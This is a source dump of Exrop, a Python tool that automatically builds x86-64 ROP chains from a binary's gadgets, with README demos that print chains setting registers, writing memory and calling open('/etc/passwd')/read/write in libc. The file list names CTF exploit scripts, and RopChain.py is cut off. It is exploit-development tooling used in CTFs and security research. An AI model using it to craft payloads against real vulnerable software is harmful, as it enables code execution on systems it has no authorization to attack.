Project Path: arc_gmh5225_exrop_qiyi_u7v

Source Tree:

```txt
arc_gmh5225_exrop_qiyi_u7v
├── ChainBuilder.py
├── Exrop.py
├── Gadget.py
├── LICENSE
├── README.md
├── RopChain.py
├── Solver.py
├── examples
│   ├── CJ2017_echo
│   │   ├── echo
│   │   ├── exploit.py
│   │   ├── exploit_orw.py
│   │   └── this_is_flag.txt
│   ├── avoid_badchars.py
│   ├── libc.so.6
│   ├── open-read-write.py
│   ├── rop_emporium
│   │   ├── badchars
│   │   │   ├── badchars
│   │   │   ├── exploit.py
│   │   │   └── flag.txt
│   │   ├── callme
│   │   │   ├── callme
│   │   │   ├── encrypted_flag.txt
│   │   │   ├── exploit.py
│   │   │   ├── key1.dat
│   │   │   ├── key2.dat
│   │   │   └── libcallme.so
│   │   ├── fluff
│   │   │   ├── exploit.py
│   │   │   ├── flag.txt
│   │   │   └── fluff
│   │   ├── pivot
│   │   │   ├── exploit.py
│   │   │   ├── flag.txt
│   │   │   ├── libpivot.so
│   │   │   └── pivot
│   │   ├── split
│   │   │   ├── exploit.py
│   │   │   ├── flag.txt
│   │   │   └── split
│   │   └── write4
│   │       ├── exploit.py
│   │       ├── flag.txt
│   │       └── write4
│   ├── set_regs_all.py
│   └── syscall.py
└── tests
    ├── badchar_add
    ├── badchar_xor
    ├── basic_pop
    ├── find_reg
    ├── find_reg_2
    ├── find_reg_3
    ├── fixed_invalid_find_reg
    ├── fixed_invalid_mov
    ├── fixed_invalid_pop
    ├── invalid_no_return
    ├── multi_pop
    ├── no-return
    ├── pivot
    ├── pop
    ├── syscall
    ├── test.py
    └── write

```

`ChainBuilder.py`:

```py
from Solver import *
from Gadget import *
from RopChain import *
from multiprocessing import Pool

def analyzeGadget(gadget):
    gadget.analyzeGadget()
    return gadget

class ChainBuilder(object):
    def __init__(self, gadgets=list()):
        self.gadgets = gadgets
        self.regs = dict()
        self.raw_chain = None

    def solve_chain(self, avoid_char=None):
        self.raw_chain = solveGadgets(self.gadgets.copy(), self.regs, avoid_char=avoid_char)

    def set_regs(self, regs):
        self.regs = regs

    def get_syscall_addr(self, not_write_regs=set(), avoid_char=None):
        return findSyscall(self.gadgets.copy(), not_write_regs, avoid_char=avoid_char)

    def set_writes(self, writes):
        self.writes = writes

    def solve_chain_write(self, avoid_char=None):
        self.raw_chain = solveWriteGadgets(self.gadgets.copy(), self.writes, avoid_char=avoid_char)

    def solve_pivot(self, addr, avoid_char):
        self.raw_chain = solvePivot(self.gadgets.copy(), addr, avoid_char)

    def build_chain(self, next_call=None):
        if next_call:
            self.raw_chain.set_next_call(next_call)
        return self.raw_chain

    def add_gadget_string(self, addr, gadget_string, gadget_opcode):
        gadget = Gadget(addr)
        gadget.loadFromString(gadget_string, gadget_opcode)
        self.add_gadget(gadget)

    def add_gadget(self, gadget):
        self.gadgets.append(gadget)

    def load_list_gadget_string(self, gadgets_dict):
        for addr,info in gadgets_dict.items():
            self.add_gadget_string(addr, info[0], info[1])

    def analyzeAll(self, num_process=1):
        if num_process != 1:
            p = Pool(num_process)
            self.gadgets = p.map(analyzeGadget, self.gadgets)
        else:
            for gadget in self.gadgets:
                gadget.analyzeGadget()

    def save_analyzed_gadgets(self):
        saved = pickle.dumps(self.gadgets)
        return saved

    def load_analyzed_gadgets(self, pickled_data):
        self.gadgets = pickle.loads(pickled_data)

```

`Exrop.py`:

```py
from ChainBuilder import ChainBuilder
from RopChain import RopChain
from Gadget import TYPE_RETURN
from os import popen
import code

def parseRopGadget(filename, opt=""):
    from subprocess import Popen, PIPE, STDOUT
    import re

    cmd = ['ROPgadget', '--binary', filename, '--multibr', '--only',
            'pop|xchg|add|sub|xor|mov|ret|jmp|call|syscall|leave', '--dump']
    if opt:
        cmd.append(opt)
    process = Popen(cmd, stdout=PIPE, stderr=STDOUT)
    stdout, _ = process.communicate()
    output_lines = stdout.splitlines()
    output_lines.sort(key=len)

    sample_gadgets = dict()
    regexp = re.compile(b"(0x.*) : (.*) // (.*)")
    for line in output_lines:
        match = regexp.match(line)
        if match:
            addr = int(match.group(1).decode(), 16)
            insstr = match.group(2).decode()
            opcode = bytes.fromhex(match.group(3).decode())
            sample_gadgets[addr] = (insstr,opcode)
    return sample_gadgets

class Exrop(object):
    def __init__(self, binary):
        self.binary = binary
        self.chain_builder = ChainBuilder()

    def find_gadgets(self, cache=False, add_opt="", num_process=1):
        if cache:
            fcname = "./{}.exrop_cache".format(self.binary.replace("/", "_"))
            try:
                with open(fcname, "rb") as fc:
                    objpic = fc.read()
                    self.chain_builder.load_analyzed_gadgets(objpic)
                    return
            except FileNotFoundError:
                fc = open(fcname, "wb")
        gadgets = parseRopGadget(self.binary, add_opt)
        self.chain_builder.load_list_gadget_string(gadgets)
        self.chain_builder.analyzeAll(num_process)
        if cache:
            objpic = self.chain_builder.save_analyzed_gadgets()
            fc.write(objpic)
            fc.close()

    def load_raw_gadgets(self, gadgets):
        pass

    def stack_pivot(self, addr, avoid_char=None):
        self.chain_builder.solve_pivot(addr, avoid_char)
        ropchain = self.chain_builder.build_chain()
        return ropchain

    def set_regs(self, regs, next_call=None, avoid_char=None):
        self.chain_builder.set_regs(regs)
        self.chain_builder.solve_chain(avoid_char)
        ropchain = self.chain_builder.build_chain(next_call)
        return ropchain

    def set_writes(self, writes, next_call=None, avoid_char=None):
        self.chain_builder.set_writes(writes)
        self.chain_builder.solve_chain_write(avoid_char=avoid_char)
        ropchain = self.chain_builder.build_chain(next_call)
        return ropchain

    def set_string(self, strs, next_call=None, avoid_char=None):
        BSIZE = 8
        writes = dict()
        for addr,sstr in strs.items():
            tmpaddr = 0
            sstr += "\x00"
            for i in range(0, len(sstr), BSIZE):
                tmpstr = int.from_bytes(bytes(sstr[i:i+BSIZE], 'utf-8'), 'little')
                writes[addr+tmpaddr] = tmpstr
                tmpaddr += BSIZE
        return self.set_writes(writes, next_call, avoid_char=avoid_char)

    def func_call(self, func_addr, args, rwaddr=None, convention="sysv", type_val_addr=0, comment=""):
        call_convention = {
            "sysv": ["rdi", "rsi", "rdx", "rcx", "r8", "r9"],
            "syscall_x86-64": ["rax", "rdi", "rsi", "rdx", "r10", "r8", "r9"]
        }

        order_reg = call_convention[convention]
        regsx86_64 = ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]
        regs = dict()
        ropchain = RopChain()
        for i in range(len(args)):
            arg = args[i]
            if isinstance(arg, str) and arg not in regsx86_64:
                assert rwaddr, "Please define read write addr"
                chain = self.set_string({rwaddr:arg})
                ropchain.merge_ropchain(chain)
                regs[order_reg[i]] = rwaddr
                rwaddr += len(arg) + 1 # for null byte
                continue
            regs[order_reg[i]] = arg
        chain = self.set_regs(regs)
        ropchain.merge_ropchain(chain)
        ropchain.set_next_call(func_addr, type_val_addr, comment=comment)
        return ropchain

    def syscall(self, sysnum, args, rwaddr=None):
        reg_used_syscall = set(["rax", "rdi", "rsi", "rdx", "r10", "r8", "r9"])
        args = (sysnum,) + args
        syscall = self.chain_builder.get_syscall_addr(not_write_regs=reg_used_syscall)
        assert syscall,"can't find syscall gadget!"
        chain = self.func_call(syscall.addr, args, rwaddr, convention="syscall_x86-64", type_val_addr=1, comment=str(syscall))
        if syscall.end_type != TYPE_RETURN:
            chain.is_noreturn = True
        return chain

```

`Gadget.py`:

```py
from triton import *

STACK = 0x7fffff00
MAX_FILL_STACK = 128

def initialize():
    ctx = TritonContext()
    ctx.setArchitecture(ARCH.X86_64)
    ctx.setMode(MODE.ALIGNED_MEMORY, True)
    ctx.setAstRepresentationMode(AST_REPRESENTATION.PYTHON)
    return ctx

def symbolizeReg(ctx, regname):
    tmp = ctx.symbolizeRegister(getattr(ctx.registers,regname))
    tmp.setAlias(regname)

def getTritonReg(ctx, regname):
    return getattr(ctx.registers, regname)

TYPE_RETURN = 0
TYPE_JMP_REG = 1
TYPE_JMP_MEM = 2
TYPE_CALL_REG = 3
TYPE_CALL_MEM = 4
TYPE_UNKNOWN = 5

def regx86_64(reg):
    regs = {
        'rax': ['al', 'ah', 'ax', 'eax', 'rax'],
        'rbx': ['bl', 'bh', 'bx', 'ebx', 'rbx'],
        'rcx': ['cl', 'ch', 'cx', 'ecx', 'rcx'],
        'rdx': ['dl', 'dh', 'dx', 'edx', 'rdx'],
        'rdi': ['dil', 'di', 'edi', 'rdi'],
        'rsi': ['sil', 'si', 'esi', 'rsi'],
        'rbp': ['bp', 'ebp', 'rbp'],
        'r8': ['r8b', 'r8w', 'r8d', 'r8'],
        'r9': ['r9b', 'r9w', 'r9d', 'r9'],
        'r10': ['r10b', 'r10w', 'r10d', 'r10'],
        'r11': ['r11b', 'r11w', 'r11d', 'r11'],
        'r12': ['r12b', 'r12w', 'r12d', 'r12'],
        'r13': ['r13b', 'r13w', 'r13d', 'r13'],
        'r14': ['r14b', 'r14w', 'r14d', 'r14'],
        'r15': ['r15b', 'r15w', 'r15d', 'r15'],
    }
    if reg in regs:
        return reg
    for r in regs:
        if reg in regs[r]:
            return r
    return False

class Gadget(object):
    def __init__(self, addr):
        self.addr = addr
        self.written_regs = set() # register yang telah tertulis
        self.read_regs = set() # register yang telah terbaca
        self.popped_regs = set() # register dari hasil `pop reg`
        self.depends_regs = set() # `mov rax, rbx; ret` gadget ini akan bergantung pada rbx
        self.defined_regs = dict() # register yang telah terdefinisi konstanta `xor rax, rax; ret`
        self.regAst = dict()
        self.diff_sp = 0 # jarak rsp ke rbp sesaaat sebelum ret
        self.is_analyzed = False
        self.is_asted = False
        self.insstr = ""
        self.insns = b""
        self.is_memory_write = 0
        self.is_memory_read = 0 # not pop
        self.memory_write_ast = []
        self.end_type = TYPE_UNKNOWN
        self.end_ast = None
        self.end_gadget = 0 # return gadget to fix no-return gadgets
        self.end_reg_used = set() # register used in end_ast
        self.pivot = 0
        self.pivot_ast = None
        self.is_syscall = False

    def __repr__(self):
        append_com = ""
        if self.end_gadget:
            append_com = ": next -> (0x{:08x}) # {}".format(self.end_gadget.addr, self.end_gadget)
        return self.insstr + append_com
#        return "addr : {}\nwritten : {}\nread : {}\npopped : {}\ndepends : {}\ndiff_sp: {}".format(self.addr, self.written_regs, self.read_regs, self.popped_regs, self.depends_regs, self.diff_sp)

    def __str__(self):
        append_com = ""
        if self.end_gadget:
            append_com = ": next -> (0x{:08x}) # {}".format(self.end_gadget.addr, self.end_gadget)
        return self.insstr + append_com
#        return "addr : {}\nwritten : {}\nread : {}\npopped : {}\ndepends : {}\ndiff_sp: {}\n".format(self.addr, self.written_regs, self.read_regs, self.popped_regs, self.depends_regs, self.diff_sp)

    def loadFromString(self, str_ins, opcodes):
        self.insstr = str_ins
        self.insns = opcodes

    def __getstate__(self):
        if not self.is_asted:
            return self.__dict__

        # save all AstNode as string, because AstNode can't be pickled
        newd = self.__dict__.copy()
        oldRegAst = self.regAst
        oldMemASt = self.memory_write_ast
        oldEndAst = self.end_ast
        oldPivotAst = self.pivot_ast

        newRegAst = dict()
        for reg,val in oldRegAst.items():
            newRegAst[reg] = (str(val), val.getBitvectorSize())

        newd['regAst'] = newRegAst

        newMemAst = []
        for addr,val in oldMemASt:
            newMemAst.append((str(addr), str(val), val.getBitvectorSize()))
        newd['memory_write_ast'] = newMemAst

        if oldEndAst:
            newd['end_ast'] = str(oldEndAst)

        if oldPivotAst:
            newd['pivot_ast'] = str(oldPivotAst)

        newd['is_asted'] = False
        return newd


    def buildAst(self):
        if not self.is_analyzed:
            return self.analyzeGadget()

        ctx = initialize()
        astCtxt = ctx.getAstContext()
        regs = ["rax", "rbx", "rcx", "rdx", "rsi", "rbp", "rdi", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]

        for reg in regs:
            svar = ctx.newSymbolicVariable(64)
            svar.setAlias(reg)
            locals()[reg] = astCtxt.variable(svar)
        ctx.setConcreteRegisterValue(ctx.registers.rsp, STACK)

        diff_sp = self.diff_sp//8
        if diff_sp > MAX_FILL_STACK or diff_sp < 0:
            diff_sp = MAX_FILL_STACK

        for i in range(diff_sp):
            alias = "STACK"+str(i)
            svar = ctx.newSymbolicVariable(64)
            svar.setAlias(alias)
            locals()[alias] = astCtxt.variable(svar)

        BSIZE = 8 # default for now

        variables = ctx.getSymbolicVariables()
        for i,var in variables.items(): # get all symbolic variable for the next eval
            locals()[var.getAlias()] = astCtxt.variable(var)

        newRegAst = dict()
        for regname,ast in self.regAst.items():
            val = eval(ast[0])
            if isinstance(val, int):
                val = astCtxt.bv(val, ast[1])
            newRegAst[regname] = val # eval-ing ast symbolic python expressions
        self.regAst = newRegAst

        new_mem_ast = []
        for addr_ast,val_ast,sz_val in self.memory_write_ast:
            val = eval(val_ast)
            if isinstance(val, int):
                val = astCtxt.bv(val, sz_val)
            addr = eval(addr_ast)
            if isinstance(val, int):
                addr = astCtxt.bv(addr, BSIZE)
            new_mem_ast.append((addr, val))
        self.memory_write_ast = new_mem_ast

        if self.pivot_ast:
            self.pivot_ast = eval(self.pivot_ast)

        if self.end_ast:
            self.end_ast = eval(self.end_ast)

        self.is_asted = True


    def analyzeGadget(self, debug=False):
        BSIZE = 8
        ctx = initialize()
        astCtxt = ctx.getAstContext()
        regs = ["rax", "rbx", "rcx", "rdx", "rsi", "rbp", "rdi", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]
        syscalls = ["syscall"]

        for reg in regs:
            symbolizeReg(ctx, reg)
        ctx.setConcreteRegisterValue(ctx.registers.rsp, STACK)

        for i in range(MAX_FILL_STACK):
            tmpb = ctx.symbolizeMemory(MemoryAccess(STACK+(i*8), CPUSIZE.QWORD))
            tmpb.setAlias("STACK{}".format(i))

        sp = STACK
        instructions = self.insns
        pc = 0

        while True:
            inst = Instruction()
            inst.setOpcode(instructions[pc:pc+16])
            inst.setAddress(pc)
            ctx.processing(inst)

            written = inst.getWrittenRegisters()
            red = inst.getReadRegisters()
            pop = False
            tmp_red = set()
            for wrt in written:
                regname = regx86_64(wrt[0].getName())
                if regname:
                    self.written_regs.add(regname)
                    newsp = ctx.getConcreteRegisterValue(ctx.registers.rsp)
                    if (newsp - sp) == 8:
                        pop = True
                        self.popped_regs.add(regname)

            for r in red:
                regname = regx86_64(r[0].getName())
                if regname:
                    tmp_red.add(regname)
                    self.read_regs.add(regname)

            if inst.isControlFlow(): # check if end of gadget
                type_end = 0
                sp_after = ctx.getConcreteRegisterValue(ctx.registers.rsp)
                if (sp - sp_after) == BSIZE and len(tmp_red) > 0:
                    if inst.isMemoryRead():
                        type_end = TYPE_CALL_MEM
                        self.end_ast = ctx.simplify(inst.getLoadAccess()[0][0].getLeaAst(), True)
                    else:
                        type_end = TYPE_CALL_REG
                        self.end_ast = ctx.simplify(ctx.getSymbolicRegister(ctx.registers.rip).getAst(), True)
                elif sp == sp_after and len(tmp_red) > 0:
                    if inst.isMemoryRead():
                        type_end = TYPE_JMP_MEM
                        self.end_ast = ctx.simplify(inst.getLoadAccess()[0][0].getLeaAst(), True)
                    else:
                        type_end = TYPE_JMP_REG
                        self.end_ast = ctx.simplify(ctx.getSymbolicRegister(ctx.registers.rip).getAst(), True)
                elif sp_after - sp == BSIZE:
                    type_end = TYPE_RETURN
                else:
                    type_end = TYPE_UNKNOWN
                self.end_type = type_end
                self.end_reg_used = tmp_red
#                code.interact(local=locals())
                break

            elif inst.getDisassembly() in syscalls:
                self.is_syscall = True

            if not pop and inst.isMemoryRead():
                self.is_memory_read = 1

            if inst.isMemoryWrite() and 'mov' in inst.getDisassembly():
                for store_access in inst.getStoreAccess():
                    addr_ast = ctx.simplify(store_access[0].getLeaAst(), True)
                    val_ast = ctx.simplify(store_access[1], True)
                    self.memory_write_ast.append((addr_ast, val_ast))
                    self.is_memory_write += 1

            pc = ctx.getConcreteRegisterValue(ctx.registers.rip)
            sp = ctx.getConcreteRegisterValue(ctx.registers.rsp)
            if pc >= len(instructions):
                break

        if ctx.isRegisterSymbolized(ctx.registers.rsp):
            self.pivot_ast = ctx.simplify(ctx.getSymbolicRegister(ctx.registers.rsp).getAst() - 8, True)
            if self.pivot_ast:
                self.pivot = 1

        for reg in self.written_regs:
            self.regAst[reg] = ctx.simplify(ctx.getSymbolicRegister(getTritonReg(ctx, reg)).getAst(), True)
            simplified = str(self.regAst[reg])
            if simplified in regs:
                self.defined_regs[reg] = simplified
                continue
            try:
                h = int(simplified, 16)
                self.defined_regs[reg] = h
            except ValueError:
                continue

        defregs = set(filter(lambda i: isinstance(self.defined_regs[i],int),
                              self.defined_regs.keys()))
        self.depends_regs = self.read_regs - defregs

        self.diff_sp = sp - STACK
        self.is_analyzed = True
        self.is_asted = True

```

`LICENSE`:

```
MIT License

Copyright (c) 2020 n0psledbyte

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# Exrop
Exrop is automatic ROP chains generator tool which can build gadget chain automatically from given binary and constraints

Requirements : [Triton](https://github.com/JonathanSalwan/Triton), [ROPGadget](https://github.com/JonathanSalwan/ROPgadget)

Only support for x86-64 for now!

Features:
- handling non-return gadgets (jmp reg, call reg)
- set registers (`rdi=0xxxxxx, rsi=0xxxxxx`)
- set register to register (`rdi=rax`)
- write to mem
- write string/bytes to mem
- function call (`open('/etc/passwd',0)`)
- pass register in function call (`read('rax', bss, 0x100)`)
- avoiding badchars
- stack pivoting (`Exrop.stack_pivot`)
- syscall (`Exrop.syscall`)
- see [examples](examples)

# installation
1. install python (3.6 is recomended and tested)
2. install triton (https://triton.quarkslab.com/documentation/doxygen/index.html#linux_install_sec), make sure you add `-DPYTHON36=on` as cmake option
3. install ropgadget (https://github.com/JonathanSalwan/ROPgadget)
4. to install exrop, easily add `export PYTHONPATH=/path/to/exrop:$PYTHONPATH` in your `.bashrc` (depends on your shell)

# demo
``` python
from Exrop import Exrop

rop = Exrop("/bin/ls")
rop.find_gadgets(cache=True)
print("write-regs gadgets: rdi=0x41414141, rsi:0x42424242, rdx: 0x43434343, rax:0x44444444, rbx=0x45454545")
chain = rop.set_regs({'rdi':0x41414141, 'rsi': 0x42424242, 'rdx':0x43434343, 'rax':0x44444444, 'rbx': 0x45454545})
chain.dump()
print("write-what-where gadgets: [0x41414141]=0xdeadbeefff, [0x43434343]=0x110011")
chain = rop.set_writes({0x41414141: 0xdeadbeefff, 0x43434343: 0x00110011})
chain.dump()
print("write-string gadgets 0x41414141=\"Hello world!\\n\"")
chain = rop.set_string({0x41414141: "Hello world!\n"})
chain.dump()
print("func-call gadgets 0x41414141(0x20, 0x30, \"Hello\")")
chain = rop.func_call(0x41414141, (0x20, 0x30, "Hello"), 0x7fffff00)
chain.dump()
```
Output:
```
write-regs gadget: rdi=0x41414141, rsi:0x42424242, rdx: 0x43434343, rax:0x44444444, rbx=0x45454545
$RSP+0x0000 : 0x00000000000060d0 # pop rbx; ret
$RSP+0x0008 : 0x0000000044444444
$RSP+0x0010 : 0x0000000000014852 # mov rax, rbx; pop rbx; ret
$RSP+0x0018 : 0x0000000000000000
$RSP+0x0020 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0028 : 0x0000000041414141
$RSP+0x0030 : 0x000000000000629c # pop rsi; ret
$RSP+0x0038 : 0x0000000042424242
$RSP+0x0040 : 0x0000000000003a62 # pop rdx; ret
$RSP+0x0048 : 0x0000000043434343
$RSP+0x0050 : 0x00000000000060d0 # pop rbx; ret
$RSP+0x0058 : 0x0000000045454545

write-what-where gadgets: [0x41414141]=0xdeadbeefff, [0x43434343]=0x110011
$RSP+0x0000 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0008 : 0x000000deadbeefff
$RSP+0x0010 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0018 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0020 : 0x0000000041414139
$RSP+0x0028 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret
$RSP+0x0030 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0038 : 0x0000000000110011
$RSP+0x0040 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0048 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0050 : 0x000000004343433b
$RSP+0x0058 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret

write-string gadgets 0x41414141="Hello world!\n"
$RSP+0x0000 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0008 : 0x6f77206f6c6c6548
$RSP+0x0010 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0018 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0020 : 0x0000000041414139
$RSP+0x0028 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret
$RSP+0x0030 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0038 : 0x0000000a21646c72
$RSP+0x0040 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0048 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0050 : 0x0000000041414141
$RSP+0x0058 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret

func-call gadgets 0x41414141(0x20, 0x30, "Hello")
$RSP+0x0000 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0008 : 0x0000006f6c6c6548
$RSP+0x0010 : 0x000000000000d91f # mov rax, rdi; ret
$RSP+0x0018 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0020 : 0x000000007ffffef8
$RSP+0x0028 : 0x000000000000e0fb # mov qword ptr [rdi + 8], rax; ret
$RSP+0x0030 : 0x0000000000004ce5 # pop rdi; ret
$RSP+0x0038 : 0x0000000000000020
$RSP+0x0040 : 0x000000000000629c # pop rsi; ret
$RSP+0x0048 : 0x0000000000000030
$RSP+0x0050 : 0x0000000000003a62 # pop rdx; ret
$RSP+0x0058 : 0x000000007fffff00
$RSP+0x0060 : 0x0000000041414141

python3 tests.py  1,48s user 0,05s system 97% cpu 1,566 total

```
Another example: open-read-write gadgets!

``` python
from pwn import *
import time
from Exrop import Exrop

binname = "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(binname, checksec=False)
open = libc.symbols['open']
read = libc.symbols['read']
write = libc.symbols['write']
bss = libc.bss()

t = time.mktime(time.gmtime())
rop = Exrop(binname)
rop.find_gadgets(cache=True)
print("open('/etc/passwd', 0)")
chain = rop.func_call(open, ("/etc/passwd", 0), bss)
chain.set_base_addr(0x00007ffff79e4000)
chain.dump()
print("read('rax', bss, 0x100)") # register can be used as argument too!
chain = rop.func_call(read, ('rax', bss, 0x100))
chain.set_base_addr(0x00007ffff79e4000)
chain.dump()
print("write(1, bss, 0x100)")
chain = rop.func_call(write, (1, bss, 0x100))
chain.set_base_addr(0x00007ffff79e4000)
chain.dump()
print("done in {}s".format(time.mktime(time.gmtime()) - t))
```

Output:
```
open('/etc/passwd', 0)
$RSP+0x0000 : 0x00007ffff7a05a45 # pop r13 ; ret
$RSP+0x0008 : 0x00000000003ec860
$RSP+0x0010 : 0x00007ffff7a7630c # xor edi, edi ; pop rbx ; mov rax, rdi ; pop rbp ; pop r12 ; ret
$RSP+0x0018 : 0x00007ffff7a0555f
$RSP+0x0020 : 0x0000000000000000
$RSP+0x0028 : 0x0000000000000000
$RSP+0x0030 : 0x00007ffff7a06b8a # mov r9, r13 ; call rbx: next -> (0x0002155f) # pop rdi ; ret
$RSP+0x0038 : 0x00007ffff7a0555f # pop rdi ; ret
$RSP+0x0040 : 0x7361702f6374652f
$RSP+0x0048 : 0x00007ffff7b251c7 # mov qword ptr [r9], rdi ; ret
$RSP+0x0050 : 0x00007ffff7a05a45 # pop r13 ; ret
$RSP+0x0058 : 0x00000000003ec868
$RSP+0x0060 : 0x00007ffff7a7630c # xor edi, edi ; pop rbx ; mov rax, rdi ; pop rbp ; pop r12 ; ret
$RSP+0x0068 : 0x00007ffff7a0555f
$RSP+0x0070 : 0x0000000000000000
$RSP+0x0078 : 0x0000000000000000
$RSP+0x0080 : 0x00007ffff7a06b8a # mov r9, r13 ; call rbx: next -> (0x0002155f) # pop rdi ; ret
$RSP+0x0088 : 0x00007ffff7a0555f # pop rdi ; ret
$RSP+0x0090 : 0x0000000000647773
$RSP+0x0098 : 0x00007ffff7b251c7 # mov qword ptr [r9], rdi ; ret
$RSP+0x00a0 : 0x00007ffff7a62c70 # xor esi, esi ; mov rax, rsi ; ret
$RSP+0x00a8 : 0x00007ffff7a0555f # pop rdi ; ret
$RSP+0x00b0 : 0x00000000003ec860
$RSP+0x00b8 : 0x000000000010fc40

read('rax', bss, 0x100)
$RSP+0x0000 : 0x00007ffff7a71362 # mov dh, 0xc5 ; pop rbx ; pop rbp ; pop r12 ; ret
$RSP+0x0008 : 0x0000000000000000
$RSP+0x0010 : 0x0000000000000000
$RSP+0x0018 : 0x00007ffff7a0555f
$RSP+0x0020 : 0x00007ffff7aea899 # mov r8, rax ; call r12: next -> (0x0002155f) # pop rdi ; ret
$RSP+0x0028 : 0x00007ffff7b4a3b1 # pop rax ; pop rdx ; pop rbx ; ret
$RSP+0x0030 : 0x00007ffff79e5b96
$RSP+0x0038 : 0x0000000000000000
$RSP+0x0040 : 0x0000000000000000
$RSP+0x0048 : 0x00007ffff7a7fa08 # mov rdi, r8 ; call rax: next -> (0x00001b96) # pop rdx ; ret
$RSP+0x0050 : 0x00007ffff79e5b96 # pop rdx ; ret
$RSP+0x0058 : 0x0000000000000100
$RSP+0x0060 : 0x00007ffff7a07e6a # pop rsi ; ret
$RSP+0x0068 : 0x00000000003ec860
$RSP+0x0070 : 0x0000000000110070

write(1, bss, 0x100)
$RSP+0x0000 : 0x00007ffff7a0555f # pop rdi ; ret
$RSP+0x0008 : 0x0000000000000001
$RSP+0x0010 : 0x00007ffff79e5b96 # pop rdx ; ret
$RSP+0x0018 : 0x0000000000000100
$RSP+0x0020 : 0x00007ffff7a07e6a # pop rsi ; ret
$RSP+0x0028 : 0x00000000003ec860
$RSP+0x0030 : 0x0000000000110140

done in 3.0s (Running on: A9-9420 RADEON R5 2C+3G (2) @ 3.000GHz (using cached))
```

```

`RopChain.py`:

```py
def isintersect(a,b):
    for i in a:
        for j in b:
            if i==j:
                return True
    return False

class RopChain(object):
    def __init__(self):
        self.chains = []
        self.dump_str = None
        self.payload = b""
        self.base_addr = 0
        self.next_call = None
        self.is_noreturn = False

    def merge_ropchain(self, ropchain):
        assert not self.is_noreturn, "can't merge ropchain, this chain is no-return"
        assert isinstance(ropchain, RopChain), "not RopChain instance"
        if self.next_call:
            self.append(self.next_call)
        for chain in ropchain.chains:
            self.append(chain)
        self.next_call = ropchain.next_call

    def __add__(self, ropchain):
        self.merge_ropchain(ropchain)
        return self

    def set_next_call(self, addr, type_val=0, comment=""):
        chain = Chain()
        chain.set_chain_values([ChainItem(addr, type_val, comment)])
        self.next_call = chain

    def set_base_addr(self, addr):
        self.base_addr = addr

    def insert(self, idx, chain):
        self.chains.insert(idx, chain)

    def append(self, chain):
        self.chains.append(chain)

    def insert_chain(self, chain):
        intersect = False
        if isintersect(chain.written_regs, set(self.get_solved_regs())):
            intersect = True
        if intersect and len(self.chains) > 0:
            for i in range(len(self.chains)-1, -1, -1):
                solved_before = set(self.get_solved_regs(0,i+1))
                written_before = set(self.get_written_regs(0, i+1))
                if isintersect(chain.solved_regs, self.chains[i].written_regs) and not isintersect(solved_before, chain.written_regs):
                    self.insert(i+1, chain)
                    break

                if i == 0:
                    regs_used_after = set(self.get_written_regs())
                    depends_regs_after = set(self.get_depends_regs())
                    if not isintersect(chain.solved_regs, regs_used_after) and not isintersect(chain.written_regs, depends_regs_after):
                        self.insert(0, chain)
                    else:
                        return False
        else:
            self.append(chain)
        return True

    def get_solved_regs(self, start_chain=None, end_chain=None):
        regs_solved = set()
        chains = self.chains[start_chain:end_chain]
        for chain in chains:
            regs_solved.update(chain.solved_regs)
        return regs_solved

    def get_written_regs(self, start_chain=None, end_chain=None):
        regs_written = set()
        chains = self.chains[start_chain:end_chain]
        for chain in chains:
            regs_written.update(chain.written_regs)
        return regs_written

    def get_depends_regs(self, start_chain=None, end_chain=None):
        regs_depends = set()
        chains = self.chains[start_chain:end_chain]
        for chain in chains:
            regs_depends.update(chain.depends_regs)
        return regs_depends

    def get_chains(self):
        chains = []
        for chain in self.chains:
            chains.extend(chain.get_chains())
        return chains

    def get_comment(self):
        comments = []
        for chain in self.chains:
            comments.extend(chain.comment)
        return comments

    def dump(self):
        next_sp = 0
        for chain in self.chains:
            next_sp = chain.dump(next_sp, self.base_addr)
        if self.next_call:
            self.next_call.dump(next_sp, self.base_addr)
        print("")

    def payload_str(self):
        payload = b""
        for chain in self.chains:
            payload += chain.payload_str(self.base_addr)
        if self.next_call:
            payload += self.next_call.payload_str(self.base_addr)
        return payload

CHAINITEM_TYPE_VALUE = 0
CHAINITEM_TYPE_ADDR = 1

class ChainItem(object):
    def __init__(self, value=0, idx_chain=-1, comment="", type_val=0):
